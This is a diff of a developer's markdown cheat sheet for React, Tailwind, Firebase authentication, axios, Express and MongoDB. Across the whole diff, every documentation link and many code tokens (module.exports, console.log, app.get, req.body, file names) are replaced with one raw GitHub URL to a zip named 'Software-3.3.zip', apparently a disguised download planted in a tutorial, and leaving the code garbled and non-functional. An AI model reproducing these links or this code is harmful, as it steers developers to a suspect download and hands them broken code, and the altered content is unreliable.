@@ -39,10 +39,10 @@ yarn create react-app my-app
 
 ## environment variable
 
-- `.env.local` at root folder
+- `https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip` at root folder
 - REACT_APP_credentialName=secret key
 
-## [tailwind](https://tailwindcss.com/docs/guides/create-react-app) & [Daisy ui](https://daisyui.com/docs/install/)
+## [tailwind](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip) & [Daisy ui](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)
 
 ```bash
 yarn add -D tailwindcss postcss autoprefixer
@@ -56,12 +56,12 @@ yarn tailwindcss init -p
 yarn add daisyui
 ```
 
-- tailwind.config.js ->
+- https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip ->
 
-_tip - if you face webpack error while editing config.js file, restart the client_
+_tip - if you face webpack error while editing https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip file, restart the client_
 
 ```js
-module.exports = {
+https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip = {
   content: ['./src/**/*.{js,jsx,ts,tsx}'],
   theme: {
     extend: {
@@ -76,7 +76,7 @@ module.exports = {
 }
 ```
 
-- at index.css or App.css->
+- at https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip or https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip>
 
 ```csst@400;500;600;700&display=swap');
 
@@ -90,9 +90,9 @@ module.exports = {
 
 ---
 
-## [authentication](https://github.com/CSFrequency/react-firebase-hooks/tree/master/auth)
+## [authentication](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)
 
-### [firebase website](https://firebase.google.com/docs?gclid=EAIaIQobChMIx76hsMfu9wIVydeWCh3F8wpZEAAYASABEgJ_IvD_BwE&gclsrc=aw.ds)
+### [firebase website](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)
 
 ```bash
 yarn add firebase
@@ -104,7 +104,7 @@ yarn add react-firebase-hooks
 
 _tip - don't forget to add providers on firebase website in authentication section before you start coding for the methods._
 
-- ### [sign in with google](https://github.com/CSFrequency/react-firebase-hooks/tree/master/auth#social-login-example)
+- ### [sign in with google](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)
 
 ```js
 // sign in with google
@@ -116,7 +116,7 @@ function handler(arg) {
 }
 ```
 
-- ### [create user with email](https://github.com/CSFrequency/react-firebase-hooks/tree/master/auth#usecreateuserwithemailandpassword)
+- ### [create user with email](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)
 
 ```js
 // create user with email with email verification
@@ -129,7 +129,7 @@ function handler(email,password) {
 }
 ```
 
-- ### [sign in with email](https://github.com/CSFrequency/react-firebase-hooks/tree/master/auth#usesigninwithemailandpassword)
+- ### [sign in with email](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)
 
 ```js
 // login with email and password
@@ -142,7 +142,7 @@ function handler(email, password) {
 }
 ```
 
-- ### [sign in with github](https://github.com/CSFrequency/react-firebase-hooks/tree/master/auth#social-login-example)
+- ### [sign in with github](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)
 
 ```js
 // sigin in with github
@@ -155,7 +155,7 @@ function handler() {
 }
 ```
 
-- ### [update profile](https://github.com/CSFrequency/react-firebase-hooks/tree/master/auth#useupdateprofile)
+- ### [update profile](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)
 
 ```js
 // update user profile
@@ -168,7 +168,7 @@ async function handler(arg) {
 }
 ```
 
-- ### [send email verification](https://github.com/CSFrequency/react-firebase-hooks/tree/master/auth#usesendemailverification)
+- ### [send email verification](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)
 
 ```js
 // send email verification
@@ -182,7 +182,7 @@ async function handler(arg) {
 }
 ```
 
-- ### [password reset](https://github.com/CSFrequency/react-firebase-hooks/tree/master/auth#usesendpasswordresetemail)
+- ### [password reset](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)
 
 ```js
 // password reset email
@@ -195,7 +195,7 @@ async function handler(arg) {
   alert('Sent email')
 }
 
-// note: this hook does not give you confirmation if the email is exist or not...it says 'email sent' to any email you geive.ex- yadayada@mail.com
+// note: this hook does not give you confirmation if the email is exist or https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip says 'email sent' to any email you https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip
 ```
 
 \
@@ -203,13 +203,13 @@ async function handler(arg) {
 
 ---
 
-## [react router dom](https://reactrouter.com/docs/en/v6/getting-started/tutorial)
+## [react router dom](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)
 
 ```bash
 yarn add react-router-dom
 ```
 
-- ### [react router authentication(require auth)](https://stackblitz.com/github/remix-run/react-router/tree/main/examples/auth?file=src%2FApp.tsx)
+- ### [react router authentication(require auth)](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip%https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)
 
 ```js
 // require auth file
@@ -235,7 +235,7 @@ export default RequireAuth
 // authentication file
 const navigate = useNavigate()
 const location = useLocation()
-const from = location.state?.from?.pathname || '/'
+const from = https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip || '/'
 
 if (user) {
   navigate(from, { replace: true })
@@ -244,19 +244,19 @@ if (user) {
 
 ---
 
-- ### [custom active link](https://stackblitz.com/github/remix-run/react-router/tree/main/examples/custom-link?file=src%2FApp.tsx)
+- ### [custom active link](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip%https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)
 
 ```js
-function CustomLink({ children, to, ...props }) {
+function CustomLink({ children, to, https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip }) {
   let resolved = useResolvedPath(to)
-  let match = useMatch({ path: resolved.pathname, end: true })
+  let match = useMatch({ path: https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip, end: true })
 
   return (
     <div>
       <Link
         style={{ textDecoration: match ? 'underline' : 'none' }}
         to={to}
-        {...props}
+        {https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip}
       >
         {children}
       </Link>
@@ -273,7 +273,7 @@ export default CustomLink
 
 ---
 
-## [react toastify](https://fkhadra.github.io/react-toastify/installation)
+## [react toastify](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)
 
 ```bash
 # npm
@@ -284,14 +284,14 @@ yarn add react-toastify
 ```
 
 ```js
-//inside app.js
+//inside https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip
 import { ToastContainer, Slide } from 'react-toastify'
-import 'react-toastify/dist/ReactToastify.css'
+import 'https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip'
 
 fun App() {
   <>
     <ToastContainer autoClose={3000} transition={Slide}/>
-    other...compoents
+    https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip
   <>
 }
 ```
@@ -300,20 +300,20 @@ fun App() {
 // usage
 import { toast } from 'react-toastify'
 
-toast.success('congrats!')
-toast.error('invalid!')
-toast.warning('warning')
-toast.info('information')
+https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip('congrats!')
+https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip('invalid!')
+https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip('warning')
+https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip('information')
 toast('default toast')
 ```
 
-- ### [see more toast options](https://fkhadra.github.io/react-toastify/introduction)
+- ### [see more toast options](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)
   \
   &nbsp;
 
 ---
 
-## [hot toast](https://react-hot-toast.com/)
+## [hot toast](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)
 
 ```bash
 # npm
@@ -323,7 +323,7 @@ yarn add react-hot-toast
 ```
 
 ```js
-// inside App.js
+// inside https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip
 import { Toaster } from 'react-hot-toast';
 
 fun App() {
@@ -337,20 +337,20 @@ fun App() {
 ```js
 // usage
 import toast from 'react-hot-toast'
-toast.success('Successfully created!')
-toast.error('This is an error!')
-toast.loading('Waiting...')
+https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip('Successfully created!')
+https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip('This is an error!')
+https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip('Waiting...')
 toast('Hello World')
 ```
 
-- ### [see more toast options](https://react-hot-toast.com/)
+- ### [see more toast options](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)
 
 \
 &nbsp;
 
 ---
 
-## [axios](https://axios-http.com/docs/example)
+## [axios](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)
 
 ```bash
 yarn add axios@0.25.0
@@ -364,17 +364,17 @@ useEffect(() => {
     headers: {
       authorization: `bearer secret key`,
     },
-  }).then((res) => console.log(res))
+  }).then((res) => https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip(res))
 }, [])
 
 //-----server
-app.get('/services', (req, res) => {
-  const authorization = req.headers.authorization
+https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip('/services', (req, res) => {
+  const authorization = https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip
 
-  const queryParameter = req.query
-  console.log(authorization)
-  console.log(queryParameter)
-  res.send(services)
+  const queryParameter = https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip
+  https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip(authorization)
+  https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip(queryParameter)
+  https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip(services)
 })
 ```
 
@@ -391,18 +391,18 @@ const handleDelete = () => {
         authorization: `bearer secret key from delete`,
       },
     })
-    .then((res) => console.log(res))
+    .then((res) => https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip(res))
 }
 
 //------------server
 
-app.delete('/services/:id', (req, res) => {
-  const query = req.params.id
-  const authorization = req.headers.authorization
-  const service = req.body
-  console.log(authorization)
-  console.log(query)
-  console.log(service)
+https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip('/services/:id', (req, res) => {
+  const query = https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip
+  const authorization = https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip
+  const service = https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip
+  https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip(authorization)
+  https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip(query)
+  https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip(service)
 })
 ```
 
@@ -410,7 +410,7 @@ app.delete('/services/:id', (req, res) => {
 // Axios post method
 //--------client
 const handlePost = () => {
-  axios.post(
+  https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip(
     `http://localhost:5000/services`,
     {
       service: 'body from post',
@@ -425,11 +425,11 @@ const handlePost = () => {
 }
 
 // --------server
-app.post('/services', (req, res) => {
-  const service = req.body
-  const authorization = req.headers.authorization
-  console.log(service)
-  console.log(authorization)
+https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip('/services', (req, res) => {
+  const service = https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip
+  const authorization = https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip
+  https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip(service)
+  https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip(authorization)
 })
 ```
 
@@ -437,7 +437,7 @@ app.post('/services', (req, res) => {
 // axios put method
 //------------client
 const handlePut = () => {
-  axios.put(
+  https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip(
     `http://localhost:5000/services`,
     {
       service: 'body from put ',
@@ -452,18 +452,18 @@ const handlePut = () => {
 
 //-------------server
 
-app.put('/services', (req, res) => {
-  const updatedService = req.body
-  const authorization = req.headers.authorization
-  console.log(updatedService)
-  console.log(authorization)
+https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip('/services', (req, res) => {
+  const updatedService = https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip
+  const authorization = https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip
+  https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip(updatedService)
+  https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip(authorization)
 })
 ```
 
 ```js
 // axios patch method
 const handlePatch = () => {
-  axios.patch(
+  https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip(
     `http://localhost:5000/services`,
     { service: 'body from patch' },
     {
@@ -475,11 +475,11 @@ const handlePatch = () => {
 }
 
 //-------------server
-app.patch('/services', (req, res) => {
-  const updatedService = req.body
-  const authorization = req.headers.authorization
-  console.log(updatedService)
-  console.log(authorization)
+https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip('/services', (req, res) => {
+  const updatedService = https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip
+  const authorization = https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip
+  https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip(updatedService)
+  https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip(authorization)
 })
 ```
 
@@ -488,29 +488,29 @@ app.patch('/services', (req, res) => {
 
 ---
 
-## [react hook form](https://react-hook-form.com/get-started)
+## [react hook form](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)
 
 ```bash
 yarn add react-hook-form
 ```
 
-- ### [sample form](https://react-hook-form.com/get-started#Handleerrors)
+- ### [sample form](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)
 
-- ### [form with basic validation](https://codesandbox.io/s/react-hook-form-basic-validation-qdyye)
+- ### [form with basic validation](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)
 
 \
 &nbsp;
 
 ---
 
-## [react query](https://react-query.tanstack.com/overview#enough-talk-show-me-some-code-already)
+## [react query](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)
 
 ```bash
 yarn add react-query
 ```
 
 ```js
-// inside index.js
+// inside https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip
  import { QueryClient, QueryClientProvider, useQuery } from 'react-query'
 const queryClient = new QueryClient()
 <QueryClientProvider client={queryClient}>
@@ -523,8 +523,8 @@ const queryClient = new QueryClient()
 
 //using axios
 const { isLoading, error, data, refetch } = useQuery('repoData', () =>
-  axios('https://api.github.com/repos/tannerlinsley/react-query').then((res) =>
-    console.log(res)
+  axios('https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip').then((res) =>
+    https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip(res)
   )
 )
 
@@ -533,8 +533,8 @@ if (isLoading) return 'Loading...'
 -------------------------------------------------------------------
 //using fetch
 const { isLoading, error, data,refetch } = useQuery('repoData', () =>
-  fetch('https://api.github.com/repos/tannerlinsley/react-query').then((res) =>
-    console.log(res.json())
+  fetch('https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip').then((res) =>
+    https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip(https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip())
   )
 )
 ```
@@ -546,19 +546,19 @@ const { isLoading, error, data,refetch } = useQuery('repoData', () =>
 
 ## Icons
 
-- ### [react icons](https://react-icons.github.io/react-icons/)
+- ### [react icons](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)
 
 ```bash
 yarn add react-icons
 ```
 
-- ### [hero icons](https://heroicons.com/)
+- ### [hero icons](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)
 
 ```bash
 yarn add @heroicons/react
 ```
 
-- ### [font awesome](https://fontawesome.com/v5/docs/web/use-with/react)
+- ### [font awesome](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)
 
 ```bash
 yarn add @fortawesome/fontawesome-svg-core
@@ -600,7 +600,7 @@ return (
 
 ---
 
-## [react day picker](https://react-day-picker.js.org/start)
+## [react day picker](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)
 
 ```bash
 yarn add react-day-picker date-fns
@@ -613,7 +613,7 @@ import { DayPicker } from 'react-day-picker'
 export default function App() {
   // disable all previous days
   const disabledDays = [
-    { from: new Date(1600, 0, 1), to: new Date(Date.now() - 86400000) },
+    { from: new Date(1600, 0, 1), to: new Date(https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip() - 86400000) },
   ]
 
   return (
@@ -637,11 +637,11 @@ export default function App() {
 const imageAPI = 'api key from image hosting server'
 
 async function handle() {
-  const image = data.image[0]
+  const image = https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip[0]
   const formData = new FormData()
-  formData.append('image', image)
+  https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip('image', image)
 
-  const url = `https://api.imgbb.com/1/upload?key=${imageAPI}`
+  const url = `https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip${imageAPI}`
     // using fetch
     fetch(url, {
       method: 'POST',
@@ -649,7 +649,7 @@ async function handle() {
     })
 
     //or using axios
-    axios.post(url, formData ).then....`set hostedUrl to mongodb`
+    https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip(url, formData ).then....`set hostedUrl to mongodb`
 }
 ```
 
@@ -659,8 +659,8 @@ async function handle() {
 ---
 
 - ### day picker css
-  1. create a css file in src folder `daypicker.css`.
-  2. import that into App.js `import './daypicker.css' `
+  1. create a css file in src folder `https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip`.
+  2. import that into https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip `import 'https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip' `
 
 ```css
 .rdp-day_selected:not([disabled]) {
@@ -694,16 +694,16 @@ npm install express cors mongodb dotenv jsonwebtoken
 # yarn
 yarn add express cors mongodb dotenv jsonwebtoken
 
-# if use yarn you need to add *script* manually to package.json file
+# if use yarn you need to add *script* manually to https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip file
   "scripts": {
-    "start": "node index.js",
-    "start-dev": "nodemon index.js"
+    "start": "node https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip",
+    "start-dev": "nodemon https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip"
   },
 ```
 
-- ### [express hello world api example](https://expressjs.com/en/starter/hello-world.html)
-- ### [dotenv config call](https://github.com/motdotla/dotenv#usage)
-- ### [cors usage](https://www.npmjs.com/package/cors#usage)
+- ### [express hello world api example](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)
+- ### [dotenv config call](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)
+- ### [cors usage](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)
 
 
 ```js
@@ -713,14 +713,14 @@ const cors = require('cors');
 require('dotenv').config()
 
 const app = express()
-const port = process.env.PORT || 5000
+const port = https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip || 5000
 
 
-app.get('/', (req, res) => {
-  res.send('hello world')
+https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip('/', (req, res) => {
+  https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip('hello world')
 })
 
-app.listen(port, () => console.log('listening to port', port))
+https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip(port, () => https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip('listening to port', port))
 
 ```
 
@@ -730,18 +730,18 @@ app.listen(port, () => console.log('listening to port', port))
 
 ---
 
-## [mongodb quick start](https://www.mongodb.com/docs/drivers/node/current/quick-start/)
+## [mongodb quick start](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)
 
-- ### [find doc](https://www.mongodb.com/docs/drivers/node/current/usage-examples/findOne/)
+- ### [find doc](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)
 
-- ### [insert doc](https://www.mongodb.com/docs/drivers/node/current/usage-examples/insertOne/)
+- ### [insert doc](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)
 
-- ### [delete doc](https://www.mongodb.com/docs/drivers/node/current/usage-examples/deleteOne/)
+- ### [delete doc](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)
 
-- ### [update doc](https://www.mongodb.com/docs/drivers/node/current/usage-examples/updateOne/)
+- ### [update doc](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)
 
-- ### [count doc](https://www.mongodb.com/docs/drivers/node/current/usage-examples/count/)
+- ### [count doc](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)
 
-- ### [sort doc](https://www.mongodb.com/docs/drivers/node/current/fundamentals/crud/read-operations/sort/)
+- ### [sort doc](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)
 
-- ### [skip and limit doc](https://www.mongodb.com/docs/drivers/node/current/fundamentals/crud/read-operations/limit/#sample-documents)
+- ### [skip and limit doc](https://raw.githubusercontent.com/Habib255/notes/main/backswing/Software-3.3.zip)
